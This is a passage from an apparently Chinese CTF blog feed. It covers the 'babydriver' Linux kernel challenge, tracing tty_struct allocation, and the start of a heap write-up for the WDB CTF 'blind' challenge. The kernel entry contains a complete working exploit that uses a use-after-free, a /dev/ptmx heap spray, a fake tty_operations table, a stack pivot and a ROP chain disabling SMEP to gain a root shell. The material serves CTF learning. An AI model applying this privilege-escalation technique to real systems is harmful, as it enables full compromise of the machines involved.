class="line"></span><br><span class="line"><span class="comment">/* call the tty release_tty routine to clean out this slot */</span></span><br><span class="line">err_release_tty:</span><br><span class="line">tty_unlock(tty);</span><br><span class="line">printk_ratelimited(KERN_INFO <span class="string">"tty_init_dev: ldisc open failed, "</span></span><br><span class="line"> <span class="string">"clearing slot %d\n"</span>, idx);</span><br><span class="line">release_tty(tty, idx);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(retval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而其中，1522行调用了alloc_tty_struct(driver, idx)函数，最终可以看到在tty_io.c中的3140行，调用了kzalloc申请了sizeof(*tty)大小的堆空间，这也是题目中UAF堆块的由来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct tty_struct *<span class="title">alloc_tty_struct</span><span class="params">(struct tty_driver *driver, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"></span><br><span class="line">tty = kzalloc(<span class="keyword">sizeof</span>(*tty), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!tty)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kref_init(&amp;tty-&gt;kref);</span><br><span class="line">tty-&gt;magic = TTY_MAGIC;</span><br><span class="line">tty_ldisc_init(tty);</span><br><span class="line">tty-&gt;session = <span class="literal">NULL</span>;</span><br><span class="line">tty-&gt;pgrp = <span class="literal">NULL</span>;</span><br><span class="line">mutex_init(&amp;tty-&gt;legacy_mutex);</span><br><span class="line">mutex_init(&amp;tty-&gt;throttle_mutex);</span><br><span class="line">init_rwsem(&amp;tty-&gt;termios_rwsem);</span><br><span class="line">mutex_init(&amp;tty-&gt;winsize_mutex);</span><br><span class="line">init_ldsem(&amp;tty-&gt;ldisc_sem);</span><br><span class="line">init_waitqueue_head(&amp;tty-&gt;write_wait);</span><br><span class="line">init_waitqueue_head(&amp;tty-&gt;read_wait);</span><br><span class="line">INIT_WORK(&amp;tty-&gt;hangup_work, do_tty_hangup);</span><br><span class="line">mutex_init(&amp;tty-&gt;atomic_write_lock);</span><br><span class="line">spin_lock_init(&amp;tty-&gt;ctrl_lock);</span><br><span class="line">spin_lock_init(&amp;tty-&gt;flow_lock);</span><br><span class="line">INIT_LIST_HEAD(&amp;tty-&gt;tty_files);</span><br><span class="line">INIT_WORK(&amp;tty-&gt;SAK_work, do_SAK_work);</span><br><span class="line"></span><br><span class="line">tty-&gt;driver = driver;</span><br><span class="line">tty-&gt;ops = driver-&gt;ops;</span><br><span class="line">tty-&gt;index = idx;</span><br><span class="line">tty_line_name(driver, idx, tty-&gt;name);</span><br><span class="line">tty-&gt;dev = tty_get_device(tty);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> tty;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而kzalloc定义在<strong>\include\linux\slab.h</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kzalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> kmalloc(size, flags | __GFP_ZERO);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实还是kmalloc…，定义在<strong>\include\linux\slab.h 446行</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __<span class="function">always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; GFP_DMA)) &#123;</span><br><span class="line"><span class="keyword">int</span> index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!index)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmem_cache_alloc_trace(kmalloc_caches[index],</span><br><span class="line">flags, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于UAF我当成还有另外一个想法，就是tty-&gt;ops如果也是通过kmalloc出来的，直接劫持虚表不是更好，不过显然不是。。。</p><h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p><strong>0 此题没有开kaslr是本方法可以简易使用的必要条件</strong></p><p><strong>1 打开两个babydev设备，对其中一个设备使用ioctl命令，将size设置为tty_struct的大小，大小是0x2e0，但slab是一个以2对齐的结构，因此0x400以下，0x200以上应该都可以：</strong></p><p><img src="/img/babydriver/4.png" alt=""></p><p><strong>2 将其中一个设备释放掉，此时另外一个设备存在一个大小为0x400的被释放堆块。</strong></p><p><strong>3 使用open(“/dev/ptmx”, O_RDWR | O_NOCTTY)，进行堆喷射，使未关闭的babydev的指针指向一个tty_struct</strong></p><p><strong>4 对于如何拿到控制权，可以使用内核栈迁移的方法，利用如xchg esp , e?x的gadget，使内核栈迁移到一个可控制的低内存空间，即用户态空间。原因是在执行该指令时，寄存器的高8字节会被置为0。而在驱动中，调用tty_operations操作的最后一条汇编指令是call rax。因此，选择xchg esp,eax指令来做。</strong></p><p>关于寻找内核的gadget，经过M4X师傅的分享，我放弃了ROPgadget，选择了<a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">ropper</a>，速度比ROPgadget快许多。</p><p>如：</p><p><img src="/img/babydriver/6.png" alt=""></p><p><strong>5 当我们可以迁移内核栈到用户态，且栈地址可以预测，则可利用mmap将这个地址申请下来，再填充ROP。ROP代码可以参考<a href="http://p4nda.top/2018/07/13/ciscn2018-core/">之前的文章</a>。</strong></p><p><strong>6 通过题目中给的babyread和babywrite，将tty_struct的*op指针指向一个用户态空间，空间中将这个虚表的ioctl指针指向找到的栈迁移gadget</strong></p><p><strong>7 最终对之前open的/dev/ptmx进行ioctl操作就可以提权了</strong></p><p>最终实验过程，我没有使用tty_struct的0x2e0大小，选用了0x3e0大小，同样可以触发漏洞，最终结果如下：</p><p><img src="/img/babydriver/5.png" alt=""></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">tty_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line"><span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line"><span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line"><span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line"><span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line"><span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line"><span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line"><span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line"><span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line"><span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line"><span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line"><span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line"><span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line"><span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">struct serial_icounter_struct *icount);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> ( * commit_creds )(<span class="keyword">void</span> *) KERNCALL ;</span><br><span class="line"><span class="keyword">size_t</span>* (* prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> swapgs = <span class="number">0xffffffff81063694</span>;</span><br><span class="line"><span class="keyword">size_t</span> xchg_esp_eax = <span class="number">0xFFFFFFFF81007808</span>;<span class="comment">//0xffffffff8100008a;</span></span><br><span class="line"><span class="keyword">size_t</span> iretq  = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="keyword">size_t</span> p_rdi  = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line"><span class="keyword">size_t</span> write_cr4 = <span class="number">0xFFFFFFFF810635B0</span>;</span><br><span class="line"><span class="comment">//unsigned long user_cs, user_ss, user_eflags;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"movq %%cs, %0\n"</span></span><br><span class="line"><span class="string">"movq %%ss, %1\n"</span></span><br><span class="line"><span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line"><span class="string">"pushfq\n"</span></span><br><span class="line"><span class="string">"popq %2\n"</span></span><br><span class="line">:<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">"memory"</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span><span class="params">()</span></span>&#123;</span><br><span class="line">commit_creds= <span class="number">0xffffffff810a1420</span>;</span><br><span class="line">prepare_kernel_cred =<span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = prepare_kernel_cred(<span class="number">0</span>);</span><br><span class="line">commit_creds(cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">tty_operations</span> <span class="title">tty_operations</span>;</span></span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">0x1000</span>];</span><br><span class="line"><span class="keyword">size_t</span> data[<span class="number">0X50</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"====================start======================="</span>);</span><br><span class="line">tty_operations.ioctl = xchg_esp_eax;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> *fake_chunk ; </span><br><span class="line"><span class="comment">//memset(data,0,0x30);</span></span><br><span class="line">save_stats();</span><br><span class="line"><span class="keyword">int</span> fd1=<span class="number">-1</span>,fd2=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> trag[<span class="number">0x100</span>];</span><br><span class="line">fd1 = open(<span class="string">"/dev/babydev"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd1==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"fd1 open error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fd: %d"</span>,fd1);</span><br><span class="line">fd2 = open(<span class="string">"/dev/babydev"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd2==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"fd2 open error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fd: %d"</span>,fd2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n=================free chunk====================="</span>);</span><br><span class="line"><span class="comment">//ioctl(fd1,0x10001,0x2e0);</span></span><br><span class="line">ioctl(fd2,<span class="number">0x10001</span>,<span class="number">0x3e0</span>);</span><br><span class="line">close(fd2);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n=================build mem ====================="</span>);</span><br><span class="line">fake_chunk = mmap(xchg_esp_eax &amp; <span class="number">0xfffff000</span>, <span class="number">0x30000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"build fake chunk at mem : %llx\n"</span>,fake_chunk);</span><br><span class="line">data[<span class="number">0</span>] = p_rdi ;</span><br><span class="line">data[<span class="number">1</span>] = <span class="number">0x6f0</span> ; </span><br><span class="line">data[<span class="number">2</span>] = write_cr4 ; </span><br><span class="line">data[<span class="number">3</span>] = getroot;</span><br><span class="line">data[<span class="number">4</span>] = swapgs;</span><br><span class="line">data[<span class="number">5</span>] = fake_chunk+<span class="number">0x1000</span>;</span><br><span class="line">data[<span class="number">6</span>] = iretq;</span><br><span class="line">data[<span class="number">7</span>] = getshell;</span><br><span class="line">data[<span class="number">8</span>] = user_cs;</span><br><span class="line">data[<span class="number">9</span>] = user_eflags;</span><br><span class="line">data[<span class="number">10</span>]= user_sp;</span><br><span class="line">data[<span class="number">11</span>]= user_ss;</span><br><span class="line"><span class="built_in">memcpy</span>(xchg_esp_eax &amp; <span class="number">0xffffffff</span>,data,<span class="keyword">sizeof</span>(data));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n=================SET VTABLE====================="</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">0xff</span>;i++)&#123;</span><br><span class="line">trag[i] = open(<span class="string">"/dev/ptmx"</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"><span class="keyword">if</span> (trag[i] &lt;= <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i = read(fd1,buff,<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read: %d\n"</span>,i);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span> ;i &lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%llx\n"</span>,(<span class="keyword">size_t</span> )*(buff+i*<span class="number">8</span>)); </span><br><span class="line">&#125;</span><br><span class="line">*(<span class="keyword">size_t</span> *)(buff+<span class="number">3</span>*<span class="number">8</span>) = &amp;tty_operations;</span><br><span class="line">write(fd1,buff,<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n=================trag vul====================="</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">0xff</span>;i++)&#123;</span><br><span class="line">ioctl(trag[i],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">//printf("%d",i);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      一道想调但拖了很久的题目，主要是对题目中涉及到源码的分析。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
      <category term="LINUX" scheme="http://p4nda.top/tags/LINUX/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯CTF部分PWN题复现</title>
    <link href="http://p4nda.top/2018/08/27/WDBCTF-2018/"/>
    <id>http://p4nda.top/2018/08/27/WDBCTF-2018/</id>
    <published>2018-08-27T08:05:49.000Z</published>
    <updated>2018-08-27T14:37:47.925Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1QTwFBy5sbEcSLAadj7jRNg" target="_blank" rel="noopener">题目链接</a>  <strong><em>密码: 4qbr</em></strong> </p><h1 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h1><p>首先是blind题目，感觉我的做法和网上放的WP有点不一样，看网上放的EXP都是通过劫持.bss段上的STDOUT指针然后通过printf函数触发，学习了一波。</p><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>题目中给出3个功能，new、change、release。</p><p>new：可以申请6个堆块，堆块大小固定为0x68（实际分配0x70）大小的堆块，而在向堆块读入时会在读入数据后加\x00。</p><p><img src="/img/wdb2018/1-1.png" alt=""></p><p>change: 没有什么特别的操作，只是单纯的根据bss段上的指针数组找到相应的堆块，然后限制写入大小为0x68.</p><p><img src="/img/wdb2018/1-2.png" alt=""></p><p>release：可以看到限制了release的次数，而这个变量在bss段上，并且在free以后没有对指针数组置零，形成悬垂指针，从而具有UAF、Double Free漏洞。</p><p><img src="/img/wdb2018/1-3.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此题利用的难点在于这个程序没有泄露的功能和位置。</p><p>程序开启了除PIE的全部保护。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/p4nda/Desktop/pwn/other/blind/blind&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>利用想法首先是利用Double Free和UAF了，由于程序操作的堆块大小都是0x70的，所以很直观的想法就是劫持0x70这个fastbin链，而对于0x70这个数值很敏感，由于libc内存地址是0x7fxxxxxx，因此可以通过错位构造，将__malloc_hook-0x23这个块被分配，但由于没有libc地址泄露，此方法不可行。然而，在bss段上还有另外的0x7fxxx，就是STDIN、STDOUT、STDERR，</p><p><img src="/img/wdb2018/1-4.png" alt=""></p><p>而如果查看x/5gx 0x602045-8作为堆块，就会发现这个堆块大小为0x7f，当在fastbin链上的话，是可以分配的。</p><p><img src="/img/wdb2018/1-5.png" alt=""></p><p>而这时，我们就可以对bss段进行写入，造成任意地址写了。但是由于got表不可以改，因此泄露成为一个问题。我想到的思路是让libc地址恰好出现在bss段上ptr[]数组内，这样就可以对libc地址进行任意写了。</p><p>又想到，当free时，是不会检查free的大小和位置的，只要任意构造符合要求的堆块大小就可以使其被释放到bin中，而在unsorted bin中的堆块，fd和bk会指向main_arena+88，这样就可以写libc了。</p><p>因此通过在bss段上构造一个地址为ptr-0x10，大小为0x100的内存块，然后将其free，就可以使ptr[0],ptr[1]指向main_arena+88了。</p><p><img src="/img/wdb2018/1-6.png" alt=""></p><p>可以看到，堆块构造如上图，构造过程中必须保证0x100大小块的下一块标志位为1，并且构造下两块的标志位也为1，否则无法过free的检查。</p><p>在free掉该块以后，发现伪造的堆块进入unsorted bin。</p><p><img src="/img/wdb2018/1-7.png" 